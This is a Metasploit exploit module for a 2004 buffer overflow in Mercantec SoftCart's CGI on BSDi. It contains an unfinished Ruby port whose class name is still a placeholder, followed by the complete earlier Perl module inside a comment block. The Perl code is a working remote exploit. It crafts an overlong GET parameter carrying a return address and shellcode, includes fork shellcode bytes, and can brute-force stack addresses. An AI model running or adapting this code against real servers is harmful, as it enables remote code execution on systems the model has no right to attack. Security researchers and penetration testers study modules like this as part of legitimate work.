require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Mercantec SoftCart CGI Overflow',
			'Description'    => %q{
				
							This is an exploit for an undisclosed buffer overflow
						
				in the SoftCart.exe CGI as shipped with Mercantec's shopping
							cart software.  It is possible to execute arbitrary code
				by
							passing a malformed CGI parameter in an HTTP GET
				request.
							This issue is known to affect SoftCart version
				4.00b.
				
					
			},
			'Author'         => [ 'skape', 'trew' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '9011'],
					[ 'MIL', '38'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x09\x0a\x0b\x0c\x0d\x20\x27\x5c\x3c\x3e\x3b\x22\x60\x7e\x24\x5e\x2a\x26\x7c\x7b\x7d\x28\x29\x3f\x5d\x5b\x00",
					'MinNops'  => 16,
					'Prepend'  => "\x6a\x02\x58\x50\x9a\x00\x00\x00\x00\x07\x00\x85\xd2\x75\x0a\x31\xc0\x40\x9a\x00\x00\x00\x00\x07\x00",
					'PrependEncoder' => "\x83\xec\x7f",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'bsdi',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 19 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mercantec_softcart;

use strict;
use base "Msf::Exploit";

my $advanced =
  {
	'StackBottom'   => [ '', 'Start address for stack ret.'                ],
	'StackTop'      => [ '', 'Stop address for stack ret.'                 ],
	'StackStep'     => [ 0,  'Number of bytes to increment between steps.' ],
	'BruteWait'     => [ 0,  'Number of seconds to wait between steps.'    ],
  };

my $info =
  {
	'Name'          => 'Mercantec SoftCart CGI Overflow',
	'Version'       => '$Revision$',
	'Authors'       =>
	  [
		'skape <mmiller [at] hick.org>',
		'trew <trew [at] exploit.us>'
	  ],
	  
	'Description'   =>
	  qq{
			This is an exploit for an undisclosed buffer overflow
			in the SoftCart.exe CGI as shipped with Mercantec's shopping
			cart software.  It is possible to execute arbitrary code by
			passing a malformed CGI parameter in an HTTP GET request.
			This issue is known to affect SoftCart version 4.00b.
},

	'Arch'          => [ 'x86' ],
	'OS'            => [ 'bsdi' ],
	'Priv'          => 0,

	'UserOpts'      =>
	  {
		'RHOST'   => [ 1, 'ADDR', 'The target HTTP server address'                         ],
		'RPORT'   => [ 1, 'PORT', 'The target HTTP server port',   80                      ],
		'VHOST'   => [ 1, 'DATA', 'The target HTTP virtual host',  'auto'                  ],
		'URI'     => [ 1, 'DATA', 'The target CGI URI',            '/cgi-bin/SoftCart.exe' ],
	  },

	'Payload'       =>
	  {
		'Space'   => 1000, # tons
		'MinNops' => 16,
		'BadChars'=> "\x09\x0a\x0b\x0c\x0d\x20\x27\x5c\x3c\x3e" .
		  "\x3b\x22\x60\x7e\x24\x5e\x2a\x26\x7c\x7b" .
		  "\x7d\x28\x29\x3f\x5d\x5b\x00",
		'PrependEncoder' => "\x83\xec\x7f", # sub $0x7f, %esp
	  },

	'Refs'          =>
	  [
		['OSVDB', '9011'],
		['MIL',   '38'],
	  ],

	'DefaultTarget' => -1,

	'Targets'       =>
	  [

		# Name                   Bottom/Ret  Top
		[ 'BSDi/4.3 Bruteforce', 0xefbf3000, 0xefbffffc ],
		[ 'BSDi/4.3',            0xefbf4b8e, 0x0        ],
	  ],
	  
	'Keys'  => ['softcart'],

	'DisclosureDate' => 'Aug 19 2004',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

#
# We must fork our child before doing fun stuff.
#
sub PayloadPrepend
{
	my $self = shift;

	return "\x6a\x02\x58\x50\x9a\x00\x00\x00\x00\x07\x00" .
	  "\x85\xd2\x75\x0a\x31\xc0\x40\x9a\x00\x00\x00" .
	  "\x00\x07\x00";
}

sub Exploit
{
	my $self = shift;
	my $targetIdx  = $self->GetVar('TARGET');
	my $payload    = $self->GetVar('EncodedPayload');
	my $shellcode  = $payload->Payload;
	my $target     = $self->Targets->[$targetIdx];
	my $ret        = $target->[1];
	my $valid;

	$self->PrintLine('[*] Trying exploit target ' . $target->[0]);

	if ($target->[0] =~ /Bruteforce/)
	{
		my $stackTop    = hex($self->GetLocal('StackTop'));
		my $stackBottom = hex($self->GetLocal('StackBottom'));
		my $stackStep   = $self->GetLocal('StackStep');
		my $wait        = $self->GetLocal('BruteWait');

		$stackBottom = $target->[1] if ($stackBottom == 0);
		$stackTop    = $target->[2] if ($stackTop == 0);
		$stackStep   = $payload->NopsLength if ($stackStep == 0);

		$self->PrintLine(sprintf('[*] Brute forcing %.8x => %.8x (step %d)...',
				$stackBottom, $stackTop, $stackStep));

		# Loop through addresses, incrementing by stackStep each interval
		for ($ret = $stackBottom, $valid = $ret + length($shellcode);
			$ret < $stackTop;
			$ret = $self->StepAddress(Address => $ret, StepSize => $stackStep, Direction => 1),
			$valid = $self->StepAddress(Address => $valid, StepSize => $stackStep, Direction => 1))
		{

			# Wrap valid around if it goes past the top
			$valid = $stackBottom if ($valid >= $stackTop);

			$self->PrintLine(sprintf("[*] Trying %.8x...", $ret));

			last if (not defined($self->transmitExploit(target => $target,
						shellcode => $shellcode, ret => $ret, valid => $valid)));

			sleep($wait);
		}
	}
	else
	{
		$valid = $ret + length($shellcode);

		$self->transmitExploit(target => $target,
			shellcode => $shellcode, ret => $ret, valid => $valid);
	}
}

sub transmitExploit
{
	my $self = shift;
	my ($target, $shellcode, $ret, $valid) = @{{@_}}{qw/target shellcode ret valid/};
	my $targetHost = $self->GetVar('RHOST');
	my $targetPort = $self->GetVar('RPORT');
	my $vhost      = $self->GetVar('VHOST');
	my $uri        = $self->GetVar('URI');
	my $bof;
	my $s;

	$vhost = $targetHost if (not defined($vhost) or $vhost eq 'auto');

	# Build payload
	$bof  = "MAA+scstoreB";
	$bof .= "A" x (524 - length($bof));
	$bof .= pack("V", $ret);
	$bof .= "MSF!";
	$bof .= pack("V", $valid);
	$bof .= $shellcode;

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $targetHost,
		'PeerPort'  => $targetPort,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintError;
		return;
	}

	# << pow! >>
	$s->Send("GET $uri?$bof HTTP/1.0\r\n" .
		  "Host: $vhost\r\n"           .
		  "\r\n");

	return 1;
}

1;

=end


end
end	
